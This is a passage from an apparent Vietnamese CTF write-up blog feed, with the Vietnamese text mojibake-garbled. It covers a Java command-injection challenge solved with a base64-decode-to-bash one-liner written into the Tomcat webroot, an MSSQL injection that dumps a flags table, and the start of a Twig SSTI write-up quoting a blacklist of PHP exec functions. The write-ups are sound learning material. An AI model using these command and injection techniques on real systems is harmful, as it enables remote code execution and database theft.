Trong Springboot thÃ¬ Ä‘á»ƒ xuáº¥t hiá»‡n webroot, ta cáº§n Ä‘Æ°a file vÃ o thÆ° má»¥c: &lt;code&gt;/tmp/tomcat-docbase.8080....&lt;/code&gt;, má»—i láº§n deploy thÃ¬ giÃ¡ trá»‹ Ä‘áº±ng sau sáº½ lÃ  cÃ¡c kÃ½ tá»± khÃ¡c, nhÆ°ng prefix Ä‘áº±ng trÆ°á»›c sáº½ luÃ´n lÃ  &lt;code&gt;tomcat-docbase.8080.&lt;/code&gt;.
MÃ¬nh thá»­ echo ná»™i dung vÃ o 1 file trong Ä‘Ã³:
&lt;img src="https://hackmd.io/_uploads/H1k-_joeke.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Ná»™i dung file Ä‘Æ°á»£c hiá»‡n lÃªn webroot:
&lt;img src="https://hackmd.io/_uploads/ByYfdjjlkl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NhÆ° váº­y thÃ¬ mÃ¬nh cÃ³ thá»ƒ láº¥y ná»™i dung flag thÃ´ng qua folder nÃ y, vÃ  trong Runtime.exec vÃ¬ táº¡i method nÃ y Java sáº½ coi cÃ¡c argument cá»§a command cÃ¡ch nhau bá»Ÿi dáº¥u cÃ¡ch, nÃªn Ä‘á»ƒ thuáº­n lá»£i trong viá»‡c sá»­ command thÃ¬ mÃ¬nh sá»­ dá»¥ng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;bash -c {echo,base64command}|{base64,-d}|{bash,-i}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Flag Ä‘Æ°á»£c Ä‘Æ°a vÃ o thÆ° má»¥c /app, nÃªn mÃ¬nh sáº½ ls Ä‘á»ƒ láº¥y tÃªn file trÆ°á»›c:
&lt;img src="https://hackmd.io/_uploads/rkmnOiigyl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh cd vÃ o thÆ° má»¥c Ä‘Ã³ trÆ°á»›c rá»“i láº¥y oputput vÃ o file &lt;code&gt;13373269.txt&lt;/code&gt;
&lt;img src="https://hackmd.io/_uploads/HJyfFisgkx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
á»p vÃ o Ä‘oáº¡n code gen cá»§a mÃ¬nh vÃ  send, káº¿t quáº£ mÃ¬nh cÃ³ flag tÃªn lÃ  &lt;code&gt;eg5mhk3q9yp3&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/S1LPYjseyg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/rywqFsixJx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Giá» thÃ¬ chá»‰ viá»‡c lÃ m Ä‘iá»u tÆ°Æ¡ng tá»± vá»›i cat file thÃ´i lÃ  mÃ¬nh cÃ³ flag trÃªn local:
&lt;img src="https://hackmd.io/_uploads/HktCKjslJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Ãp dá»¥ng lÃªn server, mÃ¬nh cÃ³ tÃªn flag lÃ  &lt;code&gt;m62dyeu1gr3t&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/rJI75oixyl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Solve :heavy_check_mark:
&lt;img src="https://hackmd.io/_uploads/SyEFqsjgJx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Flag: &lt;code&gt;ISITDTU{We1come_t0_1s1tDTU_CTF}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="hero"&gt;Hero
&lt;/h2&gt;&lt;p&gt;Má»™t challenge blackbox mÃ  khi truy cáº­p Ä‘áº¿n cÃ³ Ä‘á»™c má»—i chá»©c nÄƒng Ä‘Äƒng ká»¹ vÃ  Ä‘Äƒng nháº­p:
&lt;img src="https://hackmd.io/_uploads/rybHE9oxJx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh login vá»›i credential &lt;code&gt;a:a&lt;/code&gt;, thÃ¬ cÃ³ 3 endpoint trang web cung cáº¥p:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/heroes&lt;/li&gt;
&lt;li&gt;/genZ&lt;/li&gt;
&lt;li&gt;/old_heroes&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Äáº§u tiÃªn mÃ¬nh nghÄ© cÃ³ thá»ƒ SQLi táº¡i /genZ nhÆ°ng fuzz má»™t há»“i khÃ´ng cÃ³ gÃ¬ tiáº¿n triá»ƒn ngoÃ i or 1=1 thÃ¬ mÃ¬nh chuyá»ƒn qua endpoint /old_heroes, táº¡i Ä‘Ã¢y cÃ³ param name mÃ  khi truyá»n chuá»—i thÃ´ng thÆ°á»ng sáº½ thÃ´ng bÃ¡o lá»—i: &lt;code&gt;Invalid object name 'OldHeroDB..'&lt;/code&gt;
KhÃ¡ láº¡ vá»›i kiá»ƒu response nÃ y, mÃ¬nh tiáº¿p tá»¥c fuzzing vÃ  truyá»n dáº¥u nhÃ¡y cÃ¡c kiá»ƒu thÃ¬ nháº­n Ä‘Æ°á»£c kiá»ƒu lá»—i khÃ¡c nhau, má»—i lá»—i láº¡i vÄƒng ra má»™t Ã­t pháº§n cÃ¢u lá»‡nh SQL:
&lt;img src="https://hackmd.io/_uploads/BJwir9igkl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/SJFnScjekl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;Tá»« Ä‘Ã³ thÃ¬ mÃ¬nh tháº¥y payload Ä‘ang Ä‘Æ°á»£c truyá»n vÃ o nhiá»u hÆ¡n 1 chá»— trong cÃ¢u lá»‡nh SQL, nÃ´m na cÃ¢u lá»‡nh SQL sáº½ dáº¡ng dáº¡ng nhÆ° nÃ y (mÃ¬nh Ä‘oÃ¡n váº­y):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;.*&lt;/span&gt; &lt;span class="n"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;OldHeroDB&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="n"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;OldHeroDB&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MÃ¬nh Ä‘Ã£ cá»‘ thá»­ stacked query hoáº·c declare thÃªm biáº¿n Ä‘á»ƒ cháº¡y xp_cmdshell vÃ o pháº§n WHERE cuá»‘i nhÆ°ng lÃ m nhÆ° váº­y sáº½ lá»—i á»Ÿ pháº§n payload trÃªn, káº¿t quáº£ Ä‘á»u khÃ´ng giÃ²n
Äi tÃ¬m kiáº¿m cÃ¡c tÃ i liá»‡u vá» mssql injection, mÃ¬nh tÃ¬m tháº¥y má»™t blog khai thÃ¡c vá»›i cÃ¡i kiá»ƒu db vá»›i 2 dáº¥u cháº¥m Ä‘áº±ng sau ráº¥t giá»‘ng vá»›i challenge: &lt;a class="link" href="https://cyku.tw/no-database-mssql-injection/" target="_blank" rel="noopener"
&gt;https://cyku.tw/no-database-mssql-injection/&lt;/a&gt;
Tá»« blog trÃªn mÃ¬nh rÃºt ra Ä‘Æ°á»£c vÃ i thá»©:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;KhÃ´ng thá»ƒ stacked query&lt;/li&gt;
&lt;li&gt;Thá»±c cháº¥t khÃ´ng cÃ³ database nÃ o cÃ³ tÃªn lÃ  OldHeroDB cáº£&lt;/li&gt;
&lt;li&gt;MSSQL sáº½ loáº¡i bá» cÃ¡c dáº¥u cÃ¡ch trong quÃ¡ trÃ¬nh xá»­ lÃ½ tÃªn cá»™t -&amp;gt; cÃ³ thá»ƒ táº¡o tÃªn cá»™t vá»›i giÃ¡ trá»‹ null náº¿u nhÆ° truyá»n gÃ¡n vÃ o nÃ³ giÃ¡ trá»‹ cá»§a subquery &lt;code&gt;select 1 as [ ]&lt;/code&gt;
&lt;img src="https://hackmd.io/_uploads/HJs1h9jxyg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NhÆ° váº­y, ta Ä‘Ã£ cÃ³ thá»ƒ craft thÃ nh payload SQL Injection, Ä‘á»ƒ trÃ¡nh gáº·p lá»—i call methods on int ta sáº½ dÃ¹ng cÃ¡c properties vÃ  objects cÃ³ sáºµn trong MSSQL, mÃ  trong blogs sá»­ dá»¥ng lÃ  STY cá»§a data type &lt;code&gt;geometry&lt;/code&gt; -&amp;gt; tráº£ vá» kiá»ƒu float
&lt;img src="https://hackmd.io/_uploads/B1-025jl1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»« response cá»§a server, ta cÃ³ Ä‘Æ°á»£c 3 cá»™t cá»§a báº£ng lÃ  id, hero_name vÃ  hero_power. Äáº·c biá»‡t trong Ä‘Ã³ cá»™t hero_name cÃ³ thá»ƒ chá»©a chuá»—i.
Theo blog thÃ¬ payload cÃ³ thá»ƒ attack kiá»ƒu Union based nÃªn mÃ¬nh cÅ©ng nhÃ³m thÃªm union select vÃ  káº¿t quáº£ show ra thÃ´ng tin, tiá»‡n cho mÃ¬nh Ä‘á»ƒ dump db:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1at69jxkg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/rkUyyjslyx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ´ng viá»‡c gáº§n nhÆ° Ä‘Ã£ xong, giá» mÃ¬nh sáº½ Ä‘i mÃ² xem flag á»Ÿ Ä‘Ã¢u, náº¿u nhÆ° khÃ´ng cho dÃ¹ng xp_cmdshell Ä‘á»ƒ RCE thÃ¬ cháº¯c flag sáº½ náº±m á»Ÿ 1 báº£ng nÃ o Ä‘Ã³.
XÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c báº£ng &lt;code&gt;flags&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/BJ-mksolJe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
XÃ¡c Ä‘á»‹nh cá»™t cá»§a báº£ng &lt;code&gt;flags&lt;/code&gt; lÃ  &lt;code&gt;flag_value&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/BkoEkjjgkx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Solve :heavy_check_mark:
&lt;img src="https://hackmd.io/_uploads/ByNLyojx1g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Flag: &lt;code&gt;ISITDTU{R3g4in_m0t1vation_w1th_s1mpl3_SQL1}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>CyberSpace CTF 2024 write up - Twig Playground</title><link>https://kev1n1203.github.io/p/cyberspace-ctf-2024/</link><pubDate>Tue, 03 Sep 2024 16:46:31 +0000</pubDate><guid>https://kev1n1203.github.io/p/cyberspace-ctf-2024/</guid><description>&lt;p&gt;Trong giáº£i CyberSpace nÃ y thÃ¬ team mÃ¬nh Ä‘Ã£ Ä‘áº¡t thá»© háº¡ng khÃ¡ cao lÃ  top 2. NÃ³i riÃªng vá» máº£ng web thÃ¬ team mÃ¬nh cÃ²n 1 bÃ i web logic lÃ  khÃ´ng ká»‹p lÃ m, cÃ¡ nhÃ¢n mÃ¬nh khÃ´ng tá»± solve Ä‘Æ°á»£c bÃ i nÃ o cáº£, vÃ  bÃ i Twig Playgound lÃ  challenge mÃ  mÃ¬nh tá»‘n nhiá»u thá»i gian Ä‘á»ƒ lÃ m nháº¥t (nhÆ°ng váº«n khÃ´ng solve Ä‘Æ°á»£c)
Khi merge láº¡i Ä‘á»ƒ chÆ¡i chung thÃ¬ Ä‘iá»ƒm lá»£i sáº½ lÃ  mÃ¬nh Ä‘Æ°á»£c trao Ä‘á»•i, há»c há»i kiáº¿n thá»©c cá»§a nhá»¯ng teammates khÃ¡c. Tá»« Ä‘Ã³ giáº£m thiá»ƒu viá»‡c mÃ¬nh lÃºn quÃ¡ sÃ¢u vÃ o cÃ¡c rabbithole hoáº·c Ä‘i sai hÆ°á»›ng. NhÆ°ng nÃ³ Ä‘Ã£ háº¡i mÃ¬nh khÃ¡ nhiá»u vÃ¬ táº¡o cho mÃ¬nh thÃ³i quen xem hÆ°á»›ng cá»§a anh em trÆ°á»›c, khiáº¿n viá»‡c spot vuln vÃ  hÃ m lá»—i cá»§a mÃ¬nh trá»Ÿ nÃªn ráº¥t kÃ©m. Äiá»u nÃ y mÃ¬nh Ä‘Ã£ vÃ  Ä‘ang cá»‘ gáº¯ng kháº¯c phá»¥c, káº¿t quáº£ giáº£i nÃ y cho tháº¥y quÃ¡ trÃ¬nh nÃ y váº«n cÃ²n ráº¥t dÃ i khi mÃ¬nh váº«n chÆ°a thá»ƒ tá»± mÃ¬nh lÃ m Ä‘Æ°á»£c 1 challenge nÃ o má»™t cÃ¡ch háº³n hoi.
MÃ¬nh viáº¿t láº¡i write up nÃ y cÅ©ng chá»‰ chia sáº» láº¡i gÃ³c nhÃ¬n cá»§a mÃ¬nh vá» challenge, cÅ©ng nhÆ° nhá»¯ng kiáº¿n thá»©c mÃ¬nh há»c Ä‘Æ°á»£c vÃ¬ mÃ¬nh áº¥n tÆ°á»£ng nháº¥t vÃ  tháº¥y bÃ i nÃ y khÃ¡ hay. ThÃ´i khÃ´ng dÃ i dÃ²ng ná»¯a, báº¯t Ä‘áº§u thÃ´i!&lt;/p&gt;
&lt;h2 id="preface"&gt;Preface
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/H1fDp8V2A.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äá» bÃ i ráº¥t straightforward, lÃ  má»™t website Ä‘á»ƒ render Twig template online, thÃ¬ mÃ¬nh cÅ©ng hiá»ƒu Ä‘Æ°á»£c lÃ  pháº£i khai thÃ¡c lá»—i SSTI táº¡i challenge nÃ y.&lt;/p&gt;
&lt;h2 id="source-code-analysis"&gt;Source Code Analysis
&lt;/h2&gt;&lt;h3 id="dockerfile"&gt;Dockerfile
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;COPY ./flag /flag
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RUN mv /flag /flag-$(head -c 30 /dev/urandom | xxd -p | tr -dc &amp;#39;a-f&amp;#39; | head -c 10)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Flag Ä‘Æ°á»£c move vÃ o / vÃ  Ä‘á»•i tÃªn, yÃªu cáº§u Ä‘Æ°a ra cháº¯c cháº¯n lÃ  RCE&lt;/p&gt;
&lt;h3 id="indexphp"&gt;Index.php
&lt;/h3&gt;&lt;p&gt;Source cá»§a challenge ráº¥t Ä‘Æ¡n giáº£n, Ä‘Æ°a tháº³ng input cá»§a user vÃ o template Ä‘á»ƒ render, nhÆ°ng Ä‘iá»u mÃ¬nh chÃº Ã½ lÃ  cÃ¡i Ä‘á»‘ng blacklist nÃ y lÃ  quÃ¡ Ä‘á»§ Ä‘á»ƒ Ä‘Ã¡ háº¿t cÃ¡c payload cá»§a Hacktrick vÃ  PayloadAllTheThings ra chuá»“ng gÃ &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;loader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; \&lt;span class="n"&gt;Twig&lt;/span&gt;\&lt;span class="n"&gt;Loader&lt;/span&gt;\&lt;span class="n"&gt;ArrayLoader&lt;/span&gt;&lt;span class="p"&gt;([]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;twig&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; \&lt;span class="n"&gt;Twig&lt;/span&gt;\&lt;span class="ne"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;loader&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;twig&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;addExtension&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt; \&lt;span class="n"&gt;Twig&lt;/span&gt;\&lt;span class="n"&gt;Extension&lt;/span&gt;\&lt;span class="n"&gt;DebugExtension&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Wesley&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;age&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;items&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Apple&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Banana&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Cherry&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Dragonfruit&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="n"&gt;Ensure&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt; &lt;span class="n"&gt;SSTI&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;RCE&lt;/span&gt; &lt;span class="n"&gt;vulnerabilities&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;blacklist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;passthru&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;exec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;shell_exec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;popen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;proc_open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pcntl_exec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;_self&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;reduce&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;env&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;map&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;filter&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;encoding&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;include&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;run&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Closure&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Callable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Process&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Symfony&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;[&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span 